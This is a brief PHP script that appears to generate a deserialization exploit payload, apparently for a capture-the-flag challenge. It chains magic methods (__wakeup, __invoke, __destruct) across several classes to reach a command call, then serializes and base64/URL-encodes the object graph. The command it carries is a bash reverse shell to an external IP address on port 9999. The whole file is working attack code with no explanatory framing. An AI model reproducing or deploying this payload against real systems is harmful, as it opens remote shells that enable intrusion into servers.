<?php
class b {
    private $i_want_2_listen_2_MaoZhongDu;
    public function __construct($a)
    {
        $this->i_want_2_listen_2_MaoZhongDu = $a;
    }
}

class c {
    public function __wakeup()
    {
        a::$Do_u_like_JiaRan = true;
    }
}

class d {
    public function __invoke()
    {
        a::$Do_u_like_AFKL = true;
        return "关注嘉然," . $this->value;
    }
}

class e {
    public function __destruct()
    {
        if (a::$Do_u_like_JiaRan) {
            ($this->afkl)();
        } else {
            throw new Error("Noooooooooooooooooooooooooooo!!!!!!!!!!!!!!!!");
        }
    }
}

$b = new b('bash -c "bash -i >& /dev/tcp/1.14.102.22/9999 0>&1"');
$c = new c();
$d = new d();
$d->value = $b;
$e = new e();
$e->afkl = $d;
echo urlencode(base64_encode(serialize([$c, $e])));
